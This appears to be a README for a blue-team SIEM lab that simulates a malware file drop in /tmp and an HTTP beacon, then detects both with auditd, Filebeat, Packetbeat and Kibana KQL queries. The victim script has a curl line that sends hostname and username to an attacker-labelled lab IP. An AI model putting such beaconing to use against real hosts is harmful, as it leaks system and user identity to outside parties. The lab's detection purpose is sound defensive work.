# SIEM\_Lab\_c2 — Blue Team IoC Hunt Lab

A small lab that simulates basic malware behavior and shows how to detect it using **Filebeat (auditd)** and **Packetbeat** in the **Elastic/Kibana** stack.

---

## What this lab demonstrates

**Simulated malware behaviors:**

1. Drops a file (payload) into `/tmp`
2. "Calls home" via `curl` to an attacker server at `/beacon?user=...`

**Detection goals (Blue Team):**

* Monitor `/tmp` for suspicious file drops using **auditd** (via Filebeat)
* Capture outbound HTTP traffic using **Packetbeat**

---

## Topology

```
[Victim VM]
  ├─ Filebeat (auditd module enabled)
  ├─ Packetbeat
  └─ Simulated malware script (bash)

[Attacker VM or Host]
  └─ Python listener to capture /beacon requests
```

> This can also be done on a single VM if the listener binds to `localhost`.

---

## Why `/tmp`?

The `/tmp` folder is world-writable and often abused by malware to temporarily store payloads. It’s a high-signal location to monitor for unusual file activity with minimal noise.

---

## Repo structure

```
.
├─ scripts/
│  ├─ victim_malware_sim.sh
│  └─ attacker_listener.py
├─ beats/
│  ├─ filebeat-auditd-example.yml
│  └─ packetbeat-http-example.yml
└─ README.md
```

---

## Requirements

* Linux VM (Ubuntu/Debian tested)
* sudo access
* Elastic Stack (Elasticsearch, Kibana) running locally or remotely
* `auditd` installed and running on the victim machine

---

## Setup

### 1. Attacker listener (Python)

On the attacker host:

```python
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        if parsed.path == '/beacon':
            params = parse_qs(parsed.query)
            client_ip = self.client_address[0]
            ua = self.headers.get('User-Agent', '-')
            print(f"[+] Beacon from {client_ip} | query={params} | UA={ua}")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'OK')
```

This listens on port `8000` and prints all `/beacon?...` traffic.

---

### 2. Victim "malware" script (bash)

On the victim host (`scripts/victim_malware_sim.sh`):

```bash
#!/bin/bash

# 1) Drop a payload file in /tmp
echo "benign payload $(date)" > /tmp/p4yl04d.txt

# 2) Call home (beacon) to the attacker server
ATTACKER="192.168.56.101:8000"
curl -s "http://$ATTACKER/beacon?host=$(hostname)&user=$(whoami)"

echo "Done."
```

---

### 3. Install & enable auditd

```bash
sudo apt update
sudo apt install -y auditd audispd-plugins
sudo systemctl enable --now auditd
```

Add an audit rule to watch `/tmp`:

**Temporary rule:**

```bash
sudo auditctl -w /tmp -p wa -k payload_drop
```

**Persistent rule (survives reboot):**

```bash
echo '-w /tmp -p wa -k payload_drop' | sudo tee /etc/audit/rules.d/payload_drop.rules
sudo augenrules --load
sudo systemctl restart auditd
```

> `-p wa` = watch for **w**rites and **a**ttribute changes.

---

### 4. Install Filebeat & Packetbeat

Follow Elastic documentation for your distro. Then:

```bash
sudo filebeat modules enable auditd

sudo filebeat test config
sudo packetbeat test config

sudo systemctl enable --now filebeat
sudo systemctl enable --now packetbeat
```

Example `beats/filebeat-auditd-example.yml`:

```yaml
filebeat.modules:
  - module: auditd
    log:
      enabled: true

output.elasticsearch:
  hosts: ["http://<ELASTIC_HOST>:9200"]

setup.kibana:
  host: "<KIBANA_HOST>:5601"
```

Example `beats/packetbeat-http-example.yml`:

```yaml
packetbeat.interfaces.device: any

packetbeat.protocols:
  - type: http
    ports: [80, 8000, 8080, 5601, 9200]

output.elasticsearch:
  hosts: ["http://<ELASTIC_HOST>:9200"]

setup.kibana:
  host: "<KIBANA_HOST>:5601"
```

Restart both services after configuration:

```bash
sudo systemctl restart filebeat
sudo systemctl restart packetbeat
```

---

## Kibana: Hunting for IoCs

### 1. Beacon detection (Packetbeat)

**KQL:**

```kql
http.request.method: "GET" AND url.full: */beacon*
```

If `url.full` is missing, try:

```kql
url.path: "/beacon" OR http.request.body.content: *beacon*
```

### 2. Payload drop detection (Filebeat auditd)

**KQL:**

```kql
event.module: "auditd" AND file.path: /tmp*
```

Or search using the audit key:

```kql
event.module: "auditd" AND labels.auditd.key: "payload_drop"
```

> Note: Fields may vary slightly by Filebeat version. Use Discover to inspect the actual field names.

---

## End-to-End Test

1. Start the Python listener on attacker VM
2. Run the victim script with `ATTACKER` IP pointing to listener
3. In Kibana Discover:

   * Check `packetbeat-*` for `/beacon` GET
   * Check `filebeat-*` for `/tmp/p4yl04d.txt` write event
4. Confirm visibility on both network + endpoint

---

## IoCs simulated in this lab

* File written in `/tmp` with unusual name (`p4yl04d.txt`)
* Outbound beacon to `/beacon` endpoint via HTTP GET

---

## Safety & Ethics

This is an educational lab. Do **not** run this on production systems or networks you don’t own. Keep everything local or in an isolated VM environment.

---

## Credits

Created as part of hands-on SIEM learning.
ChatGPT helped with planning, formatting, and troubleshooting the lab flow.

---

### Appendix: Quick Commands

```bash
# Runtime audit rule
sudo auditctl -w /tmp -p wa -k payload_drop

# Persistent audit rule
echo '-w /tmp -p wa -k payload_drop' | sudo tee /etc/audit/rules.d/payload_drop.rules
sudo augenrules --load
sudo systemctl restart auditd

# KQL for Packetbeat
http.request.method: "GET" AND url.full: */beacon*

# KQL for Filebeat auditd
event.module: "auditd" AND file.path: /tmp*
